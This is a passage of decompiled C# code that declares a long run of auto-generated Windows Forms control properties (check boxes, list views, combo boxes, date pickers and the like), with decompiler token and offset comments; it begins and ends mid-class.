		internal virtual CheckBox CheckBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000680 RID: 1664
		// (get) Token: 0x06000D6E RID: 3438 RVA: 0x0004E5B3 File Offset: 0x0004C7B3
		// (set) Token: 0x06000D6F RID: 3439 RVA: 0x0004E5BB File Offset: 0x0004C7BB
		internal virtual Button Button1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000681 RID: 1665
		// (get) Token: 0x06000D70 RID: 3440 RVA: 0x0004E5C4 File Offset: 0x0004C7C4
		// (set) Token: 0x06000D71 RID: 3441 RVA: 0x0004E5CC File Offset: 0x0004C7CC
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000682 RID: 1666
		// (get) Token: 0x06000D72 RID: 3442 RVA: 0x0004E5D5 File Offset: 0x0004C7D5
		// (set) Token: 0x06000D73 RID: 3443 RVA: 0x0004E5DD File Offset: 0x0004C7DD
		internal virtual NumericUpDown NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000683 RID: 1667
		// (get) Token: 0x06000D74 RID: 3444 RVA: 0x0004E5E6 File Offset: 0x0004C7E6
		// (set) Token: 0x06000D75 RID: 3445 RVA: 0x0004E5EE File Offset: 0x0004C7EE
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000684 RID: 1668
		// (get) Token: 0x06000D76 RID: 3446 RVA: 0x0004E5F7 File Offset: 0x0004C7F7
		// (set) Token: 0x06000D77 RID: 3447 RVA: 0x0004E5FF File Offset: 0x0004C7FF
		internal virtual RadioButton RadioButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000685 RID: 1669
		// (get) Token: 0x06000D78 RID: 3448 RVA: 0x0004E608 File Offset: 0x0004C808
		// (set) Token: 0x06000D79 RID: 3449 RVA: 0x0004E610 File Offset: 0x0004C810
		internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000686 RID: 1670
		// (get) Token: 0x06000D7A RID: 3450 RVA: 0x0004E619 File Offset: 0x0004C819
		// (set) Token: 0x06000D7B RID: 3451 RVA: 0x0004E621 File Offset: 0x0004C821
		internal virtual ToolTip ToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000687 RID: 1671
		// (get) Token: 0x06000D7C RID: 3452 RVA: 0x0004E62A File Offset: 0x0004C82A
		// (set) Token: 0x06000D7D RID: 3453 RVA: 0x0004E632 File Offset: 0x0004C832
		internal virtual ComboBox ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000688 RID: 1672
		// (get) Token: 0x06000D7E RID: 3454 RVA: 0x0004E63B File Offset: 0x0004C83B
		// (set) Token: 0x06000D7F RID: 3455 RVA: 0x0004E643 File Offset: 0x0004C843
		internal virtual NotifyIcon NotifyIcon1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000689 RID: 1673
		// (get) Token: 0x06000D80 RID: 3456 RVA: 0x0004E64C File Offset: 0x0004C84C
		// (set) Token: 0x06000D81 RID: 3457 RVA: 0x0004E654 File Offset: 0x0004C854
		internal virtual LinkLabel LinkLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068A RID: 1674
		// (get) Token: 0x06000D82 RID: 3458 RVA: 0x0004E65D File Offset: 0x0004C85D
		// (set) Token: 0x06000D83 RID: 3459 RVA: 0x0004E665 File Offset: 0x0004C865
		internal virtual CheckedListBox CheckedListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068B RID: 1675
		// (get) Token: 0x06000D84 RID: 3460 RVA: 0x0004E66E File Offset: 0x0004C86E
		// (set) Token: 0x06000D85 RID: 3461 RVA: 0x0004E676 File Offset: 0x0004C876
		internal virtual ListView ListView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068C RID: 1676
		// (get) Token: 0x06000D86 RID: 3462 RVA: 0x0004E67F File Offset: 0x0004C87F
		// (set) Token: 0x06000D87 RID: 3463 RVA: 0x0004E687 File Offset: 0x0004C887
		internal virtual CheckBox CheckBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068D RID: 1677
		// (get) Token: 0x06000D88 RID: 3464 RVA: 0x0004E690 File Offset: 0x0004C890
		// (set) Token: 0x06000D89 RID: 3465 RVA: 0x0004E698 File Offset: 0x0004C898
		internal virtual MaskedTextBox MaskedTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068E RID: 1678
		// (get) Token: 0x06000D8A RID: 3466 RVA: 0x0004E6A1 File Offset: 0x0004C8A1
		// (set) Token: 0x06000D8B RID: 3467 RVA: 0x0004E6A9 File Offset: 0x0004C8A9
		internal virtual CheckBox CheckBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700068F RID: 1679
		// (get) Token: 0x06000D8C RID: 3468 RVA: 0x0004E6B2 File Offset: 0x0004C8B2
		// (set) Token: 0x06000D8D RID: 3469 RVA: 0x0004E6BA File Offset: 0x0004C8BA
		internal virtual ListView ListView3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000690 RID: 1680
		// (get) Token: 0x06000D8E RID: 3470 RVA: 0x0004E6C3 File Offset: 0x0004C8C3
		// (set) Token: 0x06000D8F RID: 3471 RVA: 0x0004E6CB File Offset: 0x0004C8CB
		internal virtual MaskedTextBox MaskedTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000691 RID: 1681
		// (get) Token: 0x06000D90 RID: 3472 RVA: 0x0004E6D4 File Offset: 0x0004C8D4
		// (set) Token: 0x06000D91 RID: 3473 RVA: 0x0004E6DC File Offset: 0x0004C8DC
		internal virtual CheckedListBox CheckedListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000692 RID: 1682
		// (get) Token: 0x06000D92 RID: 3474 RVA: 0x0004E6E5 File Offset: 0x0004C8E5
		// (set) Token: 0x06000D93 RID: 3475 RVA: 0x0004E6ED File Offset: 0x0004C8ED
		internal virtual ComboBox ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000693 RID: 1683
		// (get) Token: 0x06000D94 RID: 3476 RVA: 0x0004E6F6 File Offset: 0x0004C8F6
		// (set) Token: 0x06000D95 RID: 3477 RVA: 0x0004E6FE File Offset: 0x0004C8FE
		internal virtual DateTimePicker DateTimePicker3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000694 RID: 1684
		// (get) Token: 0x06000D96 RID: 3478 RVA: 0x0004E707 File Offset: 0x0004C907
		// (set) Token: 0x06000D97 RID: 3479 RVA: 0x0004E70F File Offset: 0x0004C90F
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000695 RID: 1685
		// (get) Token: 0x06000D98 RID: 3480 RVA: 0x0004E718 File Offset: 0x0004C918
		// (set) Token: 0x06000D99 RID: 3481 RVA: 0x0004E720 File Offset: 0x0004C920
		internal virtual CheckedListBox CheckedListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000696 RID: 1686
		// (get) Token: 0x06000D9A RID: 3482 RVA: 0x0004E729 File Offset: 0x0004C929
		// (set) Token: 0x06000D9B RID: 3483 RVA: 0x0004E731 File Offset: 0x0004C931
		internal virtual CheckedListBox CheckedListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000697 RID: 1687
		// (get) Token: 0x06000D9C RID: 3484 RVA: 0x0004E73A File Offset: 0x0004C93A
		// (set) Token: 0x06000D9D RID: 3485 RVA: 0x0004E742 File Offset: 0x0004C942
		internal virtual CheckedListBox CheckedListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000698 RID: 1688
		// (get) Token: 0x06000D9E RID: 3486 RVA: 0x0004E74B File Offset: 0x0004C94B
		// (set) Token: 0x06000D9F RID: 3487 RVA: 0x0004E753 File Offset: 0x0004C953
		internal virtual CheckedListBox CheckedListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000699 RID: 1689
		// (get) Token: 0x06000DA0 RID: 3488 RVA: 0x0004E75C File Offset: 0x0004C95C
		// (set) Token: 0x06000DA1 RID: 3489 RVA: 0x0004E764 File Offset: 0x0004C964
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069A RID: 1690
		// (get) Token: 0x06000DA2 RID: 3490 RVA: 0x0004E76D File Offset: 0x0004C96D
		// (set) Token: 0x06000DA3 RID: 3491 RVA: 0x0004E775 File Offset: 0x0004C975
		internal virtual DateTimePicker DateTimePicker4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069B RID: 1691
		// (get) Token: 0x06000DA4 RID: 3492 RVA: 0x0004E77E File Offset: 0x0004C97E
		// (set) Token: 0x06000DA5 RID: 3493 RVA: 0x0004E786 File Offset: 0x0004C986
		internal virtual ComboBox ComboBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069C RID: 1692
		// (get) Token: 0x06000DA6 RID: 3494 RVA: 0x0004E78F File Offset: 0x0004C98F
		// (set) Token: 0x06000DA7 RID: 3495 RVA: 0x0004E797 File Offset: 0x0004C997
		internal virtual CheckedListBox CheckedListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069D RID: 1693
		// (get) Token: 0x06000DA8 RID: 3496 RVA: 0x0004E7A0 File Offset: 0x0004C9A0
		// (set) Token: 0x06000DA9 RID: 3497 RVA: 0x0004E7A8 File Offset: 0x0004C9A8
		internal virtual MaskedTextBox MaskedTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069E RID: 1694
		// (get) Token: 0x06000DAA RID: 3498 RVA: 0x0004E7B1 File Offset: 0x0004C9B1
		// (set) Token: 0x06000DAB RID: 3499 RVA: 0x0004E7B9 File Offset: 0x0004C9B9
		internal virtual ListView ListView4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700069F RID: 1695
		// (get) Token: 0x06000DAC RID: 3500 RVA: 0x0004E7C2 File Offset: 0x0004C9C2
		// (set) Token: 0x06000DAD RID: 3501 RVA: 0x0004E7CA File Offset: 0x0004C9CA
		internal virtual CheckBox CheckBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A0 RID: 1696
		// (get) Token: 0x06000DAE RID: 3502 RVA: 0x0004E7D3 File Offset: 0x0004C9D3
		// (set) Token: 0x06000DAF RID: 3503 RVA: 0x0004E7DB File Offset: 0x0004C9DB
		internal virtual MaskedTextBox MaskedTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A1 RID: 1697
		// (get) Token: 0x06000DB0 RID: 3504 RVA: 0x0004E7E4 File Offset: 0x0004C9E4
		// (set) Token: 0x06000DB1 RID: 3505 RVA: 0x0004E7EC File Offset: 0x0004C9EC
		internal virtual CheckBox CheckBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A2 RID: 1698
		// (get) Token: 0x06000DB2 RID: 3506 RVA: 0x0004E7F5 File Offset: 0x0004C9F5
		// (set) Token: 0x06000DB3 RID: 3507 RVA: 0x0004E7FD File Offset: 0x0004C9FD
		internal virtual ListView ListView5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A3 RID: 1699
		// (get) Token: 0x06000DB4 RID: 3508 RVA: 0x0004E806 File Offset: 0x0004CA06
		// (set) Token: 0x06000DB5 RID: 3509 RVA: 0x0004E80E File Offset: 0x0004CA0E
		internal virtual CheckedListBox CheckedListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A4 RID: 1700
		// (get) Token: 0x06000DB6 RID: 3510 RVA: 0x0004E817 File Offset: 0x0004CA17
		// (set) Token: 0x06000DB7 RID: 3511 RVA: 0x0004E81F File Offset: 0x0004CA1F
		internal virtual ComboBox ComboBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A5 RID: 1701
		// (get) Token: 0x06000DB8 RID: 3512 RVA: 0x0004E828 File Offset: 0x0004CA28
		// (set) Token: 0x06000DB9 RID: 3513 RVA: 0x0004E830 File Offset: 0x0004CA30
		internal virtual RadioButton RadioButton2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A6 RID: 1702
		// (get) Token: 0x06000DBA RID: 3514 RVA: 0x0004E839 File Offset: 0x0004CA39
		// (set) Token: 0x06000DBB RID: 3515 RVA: 0x0004E841 File Offset: 0x0004CA41
		internal virtual ProgressBar ProgressBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A7 RID: 1703
		// (get) Token: 0x06000DBC RID: 3516 RVA: 0x0004E84A File Offset: 0x0004CA4A
		// (set) Token: 0x06000DBD RID: 3517 RVA: 0x0004E852 File Offset: 0x0004CA52
		internal virtual Button Button2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A8 RID: 1704
		// (get) Token: 0x06000DBE RID: 3518 RVA: 0x0004E85B File Offset: 0x0004CA5B
		// (set) Token: 0x06000DBF RID: 3519 RVA: 0x0004E863 File Offset: 0x0004CA63
		internal virtual CheckBox CheckBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006A9 RID: 1705
		// (get) Token: 0x06000DC0 RID: 3520 RVA: 0x0004E86C File Offset: 0x0004CA6C
		// (set) Token: 0x06000DC1 RID: 3521 RVA: 0x0004E874 File Offset: 0x0004CA74
		internal virtual DateTimePicker DateTimePicker5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AA RID: 1706
		// (get) Token: 0x06000DC2 RID: 3522 RVA: 0x0004E87D File Offset: 0x0004CA7D
		// (set) Token: 0x06000DC3 RID: 3523 RVA: 0x0004E885 File Offset: 0x0004CA85
		internal virtual DateTimePicker DateTimePicker6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AB RID: 1707
		// (get) Token: 0x06000DC4 RID: 3524 RVA: 0x0004E88E File Offset: 0x0004CA8E
		// (set) Token: 0x06000DC5 RID: 3525 RVA: 0x0004E896 File Offset: 0x0004CA96
		internal virtual MonthCalendar MonthCalendar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AC RID: 1708
		// (get) Token: 0x06000DC6 RID: 3526 RVA: 0x0004E89F File Offset: 0x0004CA9F
		// (set) Token: 0x06000DC7 RID: 3527 RVA: 0x0004E8A7 File Offset: 0x0004CAA7
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AD RID: 1709
		// (get) Token: 0x06000DC8 RID: 3528 RVA: 0x0004E8B0 File Offset: 0x0004CAB0
		// (set) Token: 0x06000DC9 RID: 3529 RVA: 0x0004E8B8 File Offset: 0x0004CAB8
		internal virtual ListView ListView6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AE RID: 1710
		// (get) Token: 0x06000DCA RID: 3530 RVA: 0x0004E8C1 File Offset: 0x0004CAC1
		// (set) Token: 0x06000DCB RID: 3531 RVA: 0x0004E8C9 File Offset: 0x0004CAC9
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006AF RID: 1711
		// (get) Token: 0x06000DCC RID: 3532 RVA: 0x0004E8D2 File Offset: 0x0004CAD2
		// (set) Token: 0x06000DCD RID: 3533 RVA: 0x0004E8DA File Offset: 0x0004CADA
		internal virtual CheckedListBox CheckedListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B0 RID: 1712
		// (get) Token: 0x06000DCE RID: 3534 RVA: 0x0004E8E3 File Offset: 0x0004CAE3
		// (set) Token: 0x06000DCF RID: 3535 RVA: 0x0004E8EB File Offset: 0x0004CAEB
		internal virtual CheckedListBox CheckedListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B1 RID: 1713
		// (get) Token: 0x06000DD0 RID: 3536 RVA: 0x0004E8F4 File Offset: 0x0004CAF4
		// (set) Token: 0x06000DD1 RID: 3537 RVA: 0x0004E8FC File Offset: 0x0004CAFC
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B2 RID: 1714
		// (get) Token: 0x06000DD2 RID: 3538 RVA: 0x0004E905 File Offset: 0x0004CB05
		// (set) Token: 0x06000DD3 RID: 3539 RVA: 0x0004E90D File Offset: 0x0004CB0D
		internal virtual DateTimePicker DateTimePicker7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B3 RID: 1715
		// (get) Token: 0x06000DD4 RID: 3540 RVA: 0x0004E916 File Offset: 0x0004CB16
		// (set) Token: 0x06000DD5 RID: 3541 RVA: 0x0004E91E File Offset: 0x0004CB1E
		internal virtual ComboBox ComboBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B4 RID: 1716
		// (get) Token: 0x06000DD6 RID: 3542 RVA: 0x0004E927 File Offset: 0x0004CB27
		// (set) Token: 0x06000DD7 RID: 3543 RVA: 0x0004E92F File Offset: 0x0004CB2F
		internal virtual CheckedListBox CheckedListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B5 RID: 1717
		// (get) Token: 0x06000DD8 RID: 3544 RVA: 0x0004E938 File Offset: 0x0004CB38
		// (set) Token: 0x06000DD9 RID: 3545 RVA: 0x0004E940 File Offset: 0x0004CB40
		internal virtual MaskedTextBox MaskedTextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B6 RID: 1718
		// (get) Token: 0x06000DDA RID: 3546 RVA: 0x0004E949 File Offset: 0x0004CB49
		// (set) Token: 0x06000DDB RID: 3547 RVA: 0x0004E951 File Offset: 0x0004CB51
		internal virtual ListView ListView7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B7 RID: 1719
		// (get) Token: 0x06000DDC RID: 3548 RVA: 0x0004E95A File Offset: 0x0004CB5A
		// (set) Token: 0x06000DDD RID: 3549 RVA: 0x0004E962 File Offset: 0x0004CB62
		internal virtual CheckBox CheckBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B8 RID: 1720
		// (get) Token: 0x06000DDE RID: 3550 RVA: 0x0004E96B File Offset: 0x0004CB6B
		// (set) Token: 0x06000DDF RID: 3551 RVA: 0x0004E973 File Offset: 0x0004CB73
		internal virtual MaskedTextBox MaskedTextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006B9 RID: 1721
		// (get) Token: 0x06000DE0 RID: 3552 RVA: 0x0004E97C File Offset: 0x0004CB7C
		// (set) Token: 0x06000DE1 RID: 3553 RVA: 0x0004E984 File Offset: 0x0004CB84
		internal virtual CheckBox CheckBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BA RID: 1722
		// (get) Token: 0x06000DE2 RID: 3554 RVA: 0x0004E98D File Offset: 0x0004CB8D
		// (set) Token: 0x06000DE3 RID: 3555 RVA: 0x0004E995 File Offset: 0x0004CB95
		internal virtual ListView ListView8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BB RID: 1723
		// (get) Token: 0x06000DE4 RID: 3556 RVA: 0x0004E99E File Offset: 0x0004CB9E
		// (set) Token: 0x06000DE5 RID: 3557 RVA: 0x0004E9A6 File Offset: 0x0004CBA6
		internal virtual CheckedListBox CheckedListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BC RID: 1724
		// (get) Token: 0x06000DE6 RID: 3558 RVA: 0x0004E9AF File Offset: 0x0004CBAF
		// (set) Token: 0x06000DE7 RID: 3559 RVA: 0x0004E9B7 File Offset: 0x0004CBB7
		internal virtual ComboBox ComboBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BD RID: 1725
		// (get) Token: 0x06000DE8 RID: 3560 RVA: 0x0004E9C0 File Offset: 0x0004CBC0
		// (set) Token: 0x06000DE9 RID: 3561 RVA: 0x0004E9C8 File Offset: 0x0004CBC8
		internal virtual RadioButton RadioButton3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BE RID: 1726
		// (get) Token: 0x06000DEA RID: 3562 RVA: 0x0004E9D1 File Offset: 0x0004CBD1
		// (set) Token: 0x06000DEB RID: 3563 RVA: 0x0004E9D9 File Offset: 0x0004CBD9
		internal virtual ProgressBar ProgressBar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006BF RID: 1727
		// (get) Token: 0x06000DEC RID: 3564 RVA: 0x0004E9E2 File Offset: 0x0004CBE2
		// (set) Token: 0x06000DED RID: 3565 RVA: 0x0004E9EA File Offset: 0x0004CBEA
		internal virtual Button Button3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C0 RID: 1728
		// (get) Token: 0x06000DEE RID: 3566 RVA: 0x0004E9F3 File Offset: 0x0004CBF3
		// (set) Token: 0x06000DEF RID: 3567 RVA: 0x0004E9FB File Offset: 0x0004CBFB
		internal virtual CheckBox CheckBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C1 RID: 1729
		// (get) Token: 0x06000DF0 RID: 3568 RVA: 0x0004EA04 File Offset: 0x0004CC04
		// (set) Token: 0x06000DF1 RID: 3569 RVA: 0x0004EA0C File Offset: 0x0004CC0C
		internal virtual DateTimePicker DateTimePicker8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C2 RID: 1730
		// (get) Token: 0x06000DF2 RID: 3570 RVA: 0x0004EA15 File Offset: 0x0004CC15
		// (set) Token: 0x06000DF3 RID: 3571 RVA: 0x0004EA1D File Offset: 0x0004CC1D
		internal virtual DateTimePicker DateTimePicker9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C3 RID: 1731
		// (get) Token: 0x06000DF4 RID: 3572 RVA: 0x0004EA26 File Offset: 0x0004CC26
		// (set) Token: 0x06000DF5 RID: 3573 RVA: 0x0004EA2E File Offset: 0x0004CC2E
		internal virtual MonthCalendar MonthCalendar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C4 RID: 1732
		// (get) Token: 0x06000DF6 RID: 3574 RVA: 0x0004EA37 File Offset: 0x0004CC37
		// (set) Token: 0x06000DF7 RID: 3575 RVA: 0x0004EA3F File Offset: 0x0004CC3F
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C5 RID: 1733
		// (get) Token: 0x06000DF8 RID: 3576 RVA: 0x0004EA48 File Offset: 0x0004CC48
		// (set) Token: 0x06000DF9 RID: 3577 RVA: 0x0004EA50 File Offset: 0x0004CC50
		internal virtual ListView ListView9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C6 RID: 1734
		// (get) Token: 0x06000DFA RID: 3578 RVA: 0x0004EA59 File Offset: 0x0004CC59
		// (set) Token: 0x06000DFB RID: 3579 RVA: 0x0004EA61 File Offset: 0x0004CC61
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C7 RID: 1735
		// (get) Token: 0x06000DFC RID: 3580 RVA: 0x0004EA6A File Offset: 0x0004CC6A
		// (set) Token: 0x06000DFD RID: 3581 RVA: 0x0004EA72 File Offset: 0x0004CC72
		internal virtual CheckedListBox CheckedListBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C8 RID: 1736
		// (get) Token: 0x06000DFE RID: 3582 RVA: 0x0004EA7B File Offset: 0x0004CC7B
		// (set) Token: 0x06000DFF RID: 3583 RVA: 0x0004EA83 File Offset: 0x0004CC83
		internal virtual CheckedListBox CheckedListBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006C9 RID: 1737
		// (get) Token: 0x06000E00 RID: 3584 RVA: 0x0004EA8C File Offset: 0x0004CC8C
		// (set) Token: 0x06000E01 RID: 3585 RVA: 0x0004EA94 File Offset: 0x0004CC94
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CA RID: 1738
		// (get) Token: 0x06000E02 RID: 3586 RVA: 0x0004EA9D File Offset: 0x0004CC9D
		// (set) Token: 0x06000E03 RID: 3587 RVA: 0x0004EAA5 File Offset: 0x0004CCA5
		internal virtual DateTimePicker DateTimePicker10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CB RID: 1739
		// (get) Token: 0x06000E04 RID: 3588 RVA: 0x0004EAAE File Offset: 0x0004CCAE
		// (set) Token: 0x06000E05 RID: 3589 RVA: 0x0004EAB6 File Offset: 0x0004CCB6
		internal virtual ComboBox ComboBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CC RID: 1740
		// (get) Token: 0x06000E06 RID: 3590 RVA: 0x0004EABF File Offset: 0x0004CCBF
		// (set) Token: 0x06000E07 RID: 3591 RVA: 0x0004EAC7 File Offset: 0x0004CCC7
		internal virtual CheckedListBox CheckedListBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CD RID: 1741
		// (get) Token: 0x06000E08 RID: 3592 RVA: 0x0004EAD0 File Offset: 0x0004CCD0
		// (set) Token: 0x06000E09 RID: 3593 RVA: 0x0004EAD8 File Offset: 0x0004CCD8
		internal virtual MaskedTextBox MaskedTextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CE RID: 1742
		// (get) Token: 0x06000E0A RID: 3594 RVA: 0x0004EAE1 File Offset: 0x0004CCE1
		// (set) Token: 0x06000E0B RID: 3595 RVA: 0x0004EAE9 File Offset: 0x0004CCE9
		internal virtual ListView ListView10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006CF RID: 1743
		// (get) Token: 0x06000E0C RID: 3596 RVA: 0x0004EAF2 File Offset: 0x0004CCF2
		// (set) Token: 0x06000E0D RID: 3597 RVA: 0x0004EAFA File Offset: 0x0004CCFA
		internal virtual CheckBox CheckBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D0 RID: 1744
		// (get) Token: 0x06000E0E RID: 3598 RVA: 0x0004EB03 File Offset: 0x0004CD03
		// (set) Token: 0x06000E0F RID: 3599 RVA: 0x0004EB0B File Offset: 0x0004CD0B
		internal virtual MaskedTextBox MaskedTextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D1 RID: 1745
		// (get) Token: 0x06000E10 RID: 3600 RVA: 0x0004EB14 File Offset: 0x0004CD14
		// (set) Token: 0x06000E11 RID: 3601 RVA: 0x0004EB1C File Offset: 0x0004CD1C
		internal virtual CheckBox CheckBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D2 RID: 1746
		// (get) Token: 0x06000E12 RID: 3602 RVA: 0x0004EB25 File Offset: 0x0004CD25
		// (set) Token: 0x06000E13 RID: 3603 RVA: 0x0004EB2D File Offset: 0x0004CD2D
		internal virtual ListView ListView11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D3 RID: 1747
		// (get) Token: 0x06000E14 RID: 3604 RVA: 0x0004EB36 File Offset: 0x0004CD36
		// (set) Token: 0x06000E15 RID: 3605 RVA: 0x0004EB3E File Offset: 0x0004CD3E
		internal virtual CheckedListBox CheckedListBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D4 RID: 1748
		// (get) Token: 0x06000E16 RID: 3606 RVA: 0x0004EB47 File Offset: 0x0004CD47
		// (set) Token: 0x06000E17 RID: 3607 RVA: 0x0004EB4F File Offset: 0x0004CD4F
		internal virtual ComboBox ComboBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D5 RID: 1749
		// (get) Token: 0x06000E18 RID: 3608 RVA: 0x0004EB58 File Offset: 0x0004CD58
		// (set) Token: 0x06000E19 RID: 3609 RVA: 0x0004EB60 File Offset: 0x0004CD60
		internal virtual RadioButton RadioButton4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D6 RID: 1750
		// (get) Token: 0x06000E1A RID: 3610 RVA: 0x0004EB69 File Offset: 0x0004CD69
		// (set) Token: 0x06000E1B RID: 3611 RVA: 0x0004EB71 File Offset: 0x0004CD71
		internal virtual ProgressBar ProgressBar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D7 RID: 1751
		// (get) Token: 0x06000E1C RID: 3612 RVA: 0x0004EB7A File Offset: 0x0004CD7A
		// (set) Token: 0x06000E1D RID: 3613 RVA: 0x0004EB82 File Offset: 0x0004CD82
